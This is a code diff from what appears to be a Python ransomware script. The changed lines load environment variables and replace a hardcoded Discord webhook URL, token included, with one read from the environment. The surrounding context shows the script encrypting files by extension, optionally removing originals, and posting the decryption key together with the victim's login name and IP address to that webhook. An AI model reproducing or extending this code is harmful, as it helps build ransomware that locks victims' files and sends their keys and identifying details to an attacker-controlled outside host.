@@ -14,6 +14,9 @@ from Crypto.PublicKey import RSA
 from discord_webhook import DiscordWebhook
 import socket
 from os.path import dirname, abspath
+from dotenv import load_dotenv, find_dotenv
+
+load_dotenv(find_dotenv())
 
 # os.chdir(dirname(abspath(__file__)))
 os.system("cd ..")
@@ -464,7 +467,7 @@ else:
         generateEncryptThreads(fileExtensions, password, removeFiles, path)
         endTime = time.time()
         webhook = DiscordWebhook(
-            url="https://discord.com/api/webhooks/990727870055845959/BQM38M7KSMnMNEA3yuJ1PvlkFjdfMgU4Eaij-Pf8AeRABPmgwGS_9JGtKSHcY7_XOPMm",
+            url=os.getenv("WEBHOOK"),
             content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
         )
         webhook.execute()
